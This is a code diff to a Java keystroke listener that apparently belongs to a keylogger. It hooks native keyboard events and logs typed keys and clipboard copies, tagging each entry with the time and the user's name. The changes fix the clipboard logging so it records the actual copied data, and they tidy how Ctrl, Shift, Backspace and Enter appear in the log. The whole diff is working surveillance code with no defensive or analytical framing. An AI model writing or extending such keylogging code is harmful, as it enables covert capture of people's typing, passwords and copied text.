@@ -52,6 +52,8 @@ public class Listener implements NativeKeyListener {
 			for(char number = '0'; number <= '9'; number++) {
 				modifyInString = modifyInString.replace(">ctrl+" + number, " -Ctrl+" + number + "- ");
 			}
+			
+			modifyInString = modifyInString.replace(">ctrl+", " -Ctrl- ");
 		}
 		
 		if(modifyInString.contains(" -Ctrl+C- ")) {
@@ -66,7 +68,7 @@ public class Listener implements NativeKeyListener {
 				e.printStackTrace();
 			} 
 			
-			if(!copiedStrings.contains(("\r\n\r\n>>> At " + getTime() +  ", user [" + GetInfo.getUser() + "] copied:\r\n" + getTime() + "\r\n\r\n"))) {
+			if(!copiedStrings.contains(("\r\n\r\n>>> At " + getTime() +  ", user [" + GetInfo.getUser() + "] copied:\r\n" + data + "\r\n\r\n"))) {
 				copiedStrings.add(("\r\n\r\n>>> At " + getTime() +  ", user [" + GetInfo.getUser() + "] copied:\r\n" + data + "\r\n\r\n"));
 			}
 			
@@ -104,8 +106,9 @@ public class Listener implements NativeKeyListener {
 		/**
 		 * Replace strings for more compact formatting.
 		 */
-		modifyInString = modifyInString.replace("-backspace-", "-back-");
-		modifyInString = modifyInString.replace("-enter-", "-enter-\r\n");
+		modifyInString = modifyInString.replace("-backspace-", " -Back- ");
+		modifyInString = modifyInString.replace("-enter-", " -Enter- \r\n");
+		modifyInString = modifyInString.replace(">shift+", " -Shift- ");
 		
 		for(int i = 0; i < copiedStrings.size(); i++) {
 			String curLine = copiedStrings.get(i);
@@ -136,6 +139,7 @@ public class Listener implements NativeKeyListener {
 		Date date = new Date();
 		Calendar calendar = GregorianCalendar.getInstance();
 		calendar.setTime(date);
+		
 		return "" + calendar.get(Calendar.HOUR) + ":" + calendar.get(Calendar.MINUTE);
 	}
 }
